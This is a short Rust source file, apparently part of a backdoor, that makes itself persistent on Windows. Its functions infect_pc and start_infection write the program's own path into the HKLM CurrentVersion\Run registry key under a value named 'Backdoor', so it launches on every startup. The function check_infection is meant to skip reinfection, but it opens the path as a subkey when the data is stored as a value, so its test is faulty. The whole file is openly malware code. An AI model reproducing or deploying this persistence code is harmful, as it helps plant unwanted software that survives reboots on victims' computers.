#[cfg(target_os = "windows")]
extern crate winreg;

use std::env::{consts::OS, current_exe};
use std::path::{Path, PathBuf};
#[cfg(target_os = "windows")]
use winreg::enums::*;
#[cfg(target_os = "windows")]
use winreg::RegKey;

fn infect_pc() {
    let current_path: PathBuf = current_exe().unwrap();
    match OS {
        "windows" =>{
        
            #[cfg(target_os = "windows")]
            let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
            let path = Path::new("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
            #[cfg(target_os = "windows")]
            let (key, disp) = hklm.create_subkey(&path).unwrap();
            #[cfg(target_os = "windows")]
            match disp {
                REG_CREATED_NEW_KEY => println!("A new key has been created"),
                REG_OPENED_EXISTING_KEY => println!("An existing key has been opened"),
            }
            #[cfg(target_os = "windows")]
            let _ = key.set_value(
                "Backdoor",
                &current_path.into_os_string().into_string().unwrap(),
            );}
        
        "linux" => (),
        "macos" => (),
        _ => {}
    }
}

#[cfg(target_os = "windows")]
fn check_infection() -> bool {
    

        let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
        let path = Path::new("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Backdoor");

        if hklm.open_subkey(&path).is_err() {
            return false;
        }
    true
}
#[cfg(target_os = "windows")]
pub fn start_infection() {
    if !check_infection() {
        infect_pc();
    }
}
